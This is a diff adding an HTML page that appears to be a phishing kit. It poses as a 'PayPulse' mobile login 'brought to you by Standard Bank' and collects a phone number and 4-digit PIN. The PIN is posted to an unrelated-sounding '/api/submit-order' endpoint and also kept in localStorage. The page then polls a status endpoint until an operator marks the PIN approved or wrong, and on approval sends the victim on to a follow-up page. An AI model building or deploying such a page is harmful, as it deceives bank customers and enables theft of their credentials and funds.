@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PayPulse | Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            /* Vertical gradient transitioning from pale blue-gray at top to very light gray at bottom */
+            background: linear-gradient(180deg, #C7D2DC 0%, #E5E5E5 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding: 20px 16px;
+        }
+
+        /* Portrait-oriented mobile container wrapper preserving exact proportions */
+        .mobile-viewport {
+            width: 100%;
+            max-width: 400px;
+            min-height: 720px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 32px 24px;
+        }
+
+        /* Top Stack: Logo, Profile Icon, Heading, Inputs */
+        .top-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Brand Logo with open rounded golden outline and heartbeat line */
+        .brand-logo-wrapper {
+            margin-top: 10px;
+            margin-bottom: 36px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px 22px;
+            border: 2px solid #F5BF60;
+            border-radius: 12px;
+            /* Creates the thin, partially open rectangular golden outline effect */
+            border-left-style: dashed; 
+        }
+
+        .brand-wordmark {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: #182342;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .pulse-line-icon {
+            color: #F5BF60;
+            font-size: 20px;
+            margin: 0 1px;
+        }
+
+        /* Circular Profile Icon */
+        .profile-icon-container {
+            width: 76px;
+            height: 76px;
+            border-radius: 50%;
+            border: 2px solid #174B76;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #174B76;
+            background: rgba(23, 75, 118, 0.04);
+            margin-bottom: 28px;
+        }
+
+        .profile-icon-container i {
+            font-size: 38px;
+        }
+
+        /* Main Heading */
+        .login-heading {
+            font-size: 26px;
+            font-weight: 700;
+            color: #182342;
+            text-align: center;
+            margin-bottom: 32px;
+            letter-spacing: -0.3px;
+        }
+
+        /* Mobile Number Input */
+        .phone-input-field {
+            width: 100%;
+            height: 54px;
+            background: #FFFFFF;
+            border: 1px solid #8C9EAC;
+            border-radius: 6px;
+            padding: 0 16px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #182342;
+            text-align: center;
+            outline: none;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+            transition: border-color 0.2s ease;
+            margin-bottom: 14px;
+        }
+
+        .phone-input-field:focus {
+            border-color: #174B76;
+            box-shadow: 0 0 0 2px rgba(23, 75, 118, 0.1);
+        }
+
+        .phone-input-field::placeholder {
+            color: #8C9EAC;
+            font-weight: 400;
+        }
+
+        /* Inline Error Message Box */
+        .pp-error-box {
+            width: 100%;
+            display: none;
+            align-items: flex-start;
+            text-align: left;
+            gap: 10px;
+            margin-bottom: 14px;
+            padding: 0 4px;
+        }
+
+        .pp-error-box i {
+            color: #D97706;
+            font-size: 15px;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .pp-error-text {
+            color: #182342;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        /* PIN Instruction */
+        .pin-instruction {
+            font-size: 15px;
+            font-weight: 400;
+            color: #4A5568;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+
+        /* Four PIN Input Boxes */
+        .pin-boxes-container {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .pin-box {
+            width: 54px;
+            height: 58px;
+            background: #FFFFFF;
+            border: 1px solid #8C9EAC;
+            border-radius: 9px;
+            font-size: 22px;
+            font-weight: 600;
+            color: #182342;
+            text-align: center;
+            outline: none;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.04);
+            transition: all 0.2s ease;
+        }
+
+        .pin-box:focus {
+            border-color: #174B76;
+            box-shadow: 0 0 0 3px rgba(23, 75, 118, 0.12);
+        }
+
+        /* Bottom Section: Large Vertical Gap Area, Login Button, Footer */
+        .bottom-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;
+            padding-top: 40px;
+        }
+
+        /* Wide Gradient Login Button (approx 85% width, 68px height) */
+        .btn-login {
+            width: 85%;
+            height: 68px;
+            background: linear-gradient(90deg, #0A3768 0%, #315B83 100%);
+            color: #FFFFFF;
+            border: none;
+            border-radius: 34px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 6px 16px rgba(10, 55, 104, 0.25);
+            transition: transform 0.15s ease, opacity 0.2s ease;
+            letter-spacing: 0.5px;
+            margin-bottom: 28px;
+        }
+
+        .btn-login:hover:not(:disabled) {
+            transform: translateY(-1px);
+        }
+
+        .btn-login:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.45;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* Footer Section */
+        .footer-container {
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .footer-bank-line {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2D3748;
+        }
+
+        .footer-bank-line i {
+            font-size: 14px;
+            color: #174B76;
+        }
+
+        .footer-links-line {
+            font-size: 12px;
+            font-weight: 500;
+            color: #5A6A85;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.15s ease;
+        }
+
+        .footer-links-line:hover {
+            color: #182342;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-viewport">
+        
+        <!-- Top Stack -->
+        <div class="top-stack">
+            <!-- Brand Logo -->
+            <div class="brand-logo-wrapper">
+                <div class="brand-wordmark">
+                    PAYP<i class="fa-solid fa-heart-pulse pulse-line-icon"></i>LSE
+                </div>
+            </div>
+
+            <!-- Profile Icon -->
+            <div class="profile-icon-container">
+                <i class="fa-solid fa-user"></i>
+            </div>
+
+            <!-- Main Heading -->
+            <h1 class="login-heading">Let's sign you in</h1>
+
+            <!-- Mobile Number Field -->
+            <input type="tel" id="mobileNumber" class="phone-input-field" placeholder="Mobile Number" inputmode="numeric" required oninput="validateForm()">
+
+            <!-- Inline Error Message Box -->
+            <div id="inlineErrorBox" class="pp-error-box">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <div id="errorText" class="pp-error-text">Authentication failed. Please try again.</div>
+            </div>
+
+            <!-- PIN Instruction -->
+            <p class="pin-instruction">Enter Your PIN to Login</p>
+
+            <!-- 4 PIN Input Boxes -->
+            <div class="pin-boxes-container">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="pin1" oninput="handlePinInput(this, 'pin2')" onkeydown="handleKeyDown(event, null, 'pin1')">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="pin2" oninput="handlePinInput(this, 'pin3')" onkeydown="handleKeyDown(event, 'pin1', 'pin2')">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="pin3" oninput="handlePinInput(this, 'pin4')" onkeydown="handleKeyDown(event, 'pin2', 'pin3')">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="pin4" oninput="handlePinInput(this, null)" onkeydown="handleKeyDown(event, 'pin3', 'pin4')">
+            </div>
+        </div>
+
+        <!-- Bottom Stack: Generous Vertical Spacing Area, Button, Footer -->
+        <div class="bottom-stack">
+            <!-- Login Button -->
+            <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Log In</button>
+
+            <!-- Footer -->
+            <div class="footer-container">
+                <div class="footer-bank-line">
+                    Brought to you by <i class="fa-solid fa-shield-halved"></i> <strong>Standard Bank</strong>
+                </div>
+                <div class="footer-links-line" onclick="alert('Privacy Policy & Terms and Conditions')">
+                    Privacy Policy & Terms and Conditions
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const mobileInput = document.getElementById('mobileNumber');
+        const loginBtn = document.getElementById('loginBtn');
+        const pin1 = document.getElementById('pin1');
+        const pin2 = document.getElementById('pin2');
+        const pin3 = document.getElementById('pin3');
+        const pin4 = document.getElementById('pin4');
+        const errorBox = document.getElementById('inlineErrorBox');
+        const errorText = document.getElementById('errorText');
+
+        let activeInterval = null;
+        const pageLoadTimestamp = Date.now();
+
+        window.addEventListener('DOMContentLoaded', () => {
+            localStorage.removeItem('paypulseApprovalTimestamp');
+            const savedPhone = localStorage.getItem('paypulseUserPhone') || localStorage.getItem('userPhone');
+            if (savedPhone && mobileInput) {
+                mobileInput.value = savedPhone;
+                validateForm();
+            }
+        });
+
+        function showInlineError(message) {
+            errorText.innerText = message;
+            errorBox.style.display = 'flex';
+        }
+
+        function hideInlineError() {
+            errorBox.style.display = 'none';
+        }
+
+        // Form validation to enable/disable login button
+        function validateForm() {
+            const phoneVal = mobileInput.value.trim();
+            const p1 = pin1.value;
+            const p2 = pin2.value;
+            const p3 = pin3.value;
+            const p4 = pin4.value;
+
+            const isPhoneValid = phoneVal.length >= 7;
+            const isPinComplete = p1 && p2 && p3 && p4;
+
+            if (isPhoneValid && isPinComplete) {
+                loginBtn.removeAttribute('disabled');
+            } else {
+                loginBtn.setAttribute('disabled', 'true');
+            }
+            hideInlineError();
+        }
+
+        // Auto-advance focus on digit entry
+        function handlePinInput(current, nextFieldId) {
+            current.value = current.value.replace(/[^0-9]/g, '');
+
+            if (current.value.length === 1 && nextFieldId) {
+                document.getElementById(nextFieldId).focus();
+            }
+            validateForm();
+        }
+
+        // Handle backspace navigation between PIN boxes
+        function handleKeyDown(event, prevFieldId, currentFieldId) {
+            if (event.key === 'Backspace') {
+                const currentField = document.getElementById(currentFieldId);
+                if (currentField.value === '' && prevFieldId) {
+                    document.getElementById(prevFieldId).focus();
+                } else {
+                    currentField.value = '';
+                }
+                validateForm();
+            }
+        }
+
+        // API Submission and Polling
+        function handleLogin() {
+            const phone = mobileInput.value.trim();
+            const pin = pin1.value + pin2.value + pin3.value + pin4.value;
+
+            if (!phone || phone.length < 7) {
+                showInlineError('Please enter a valid mobile number.');
+                return;
+            }
+
+            if (pin.length !== 4) {
+                showInlineError('Please enter a complete 4-digit PIN.');
+                return;
+            }
+
+            localStorage.setItem('paypulseUserPhone', phone);
+            localStorage.setItem('userPhone', phone);
+            localStorage.setItem('paypulseUserPin', pin);
+
+            submitLoginCredentials(phone, pin);
+        }
+
+        async function submitLoginCredentials(phone, pin) {
+            try {
+                loginBtn.setAttribute('disabled', 'true');
+                loginBtn.textContent = 'Authenticating...';
+                loginBtn.style.opacity = '0.8';
+
+                const response = await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone, uniqueId: 'Login PIN: ' + pin })
+                });
+
+                const result = await response.json();
+
+                if (result.success !== false) {
+                    pollApprovalStatus(phone);
+                } else {
+                    showInlineError('Authentication failed. Please verify your credentials.');
+                    resetButtonState();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                pollApprovalStatus(phone);
+            }
+        }
+
+        function resetButtonState() {
+            loginBtn.style.opacity = '1';
+            loginBtn.textContent = 'Log In';
+            pin1.value = '';
+            pin2.value = '';
+            pin3.value = '';
+            pin4.value = '';
+            validateForm();
+            pin1.focus();
+        }
+
+        function pollApprovalStatus(phone) {
+            const cleanPhone = phone.trim();
+
+            if (activeInterval) clearInterval(activeInterval);
+
+            const submissionTimestamp = Date.now();
+
+            activeInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
+                    const data = await response.json();
+
+                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
+                        clearInterval(activeInterval);
+                        window.location.href = 'scratch.html';
+                    } 
+                    else if ((data.status === 'rejected' || data.status === 'wrong_id') && data.timestamp && data.timestamp >= submissionTimestamp) {
+                        clearInterval(activeInterval);
+                        showInlineError('⚠️ Incorrect PIN. Please check and try again.');
+                        resetButtonState();
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
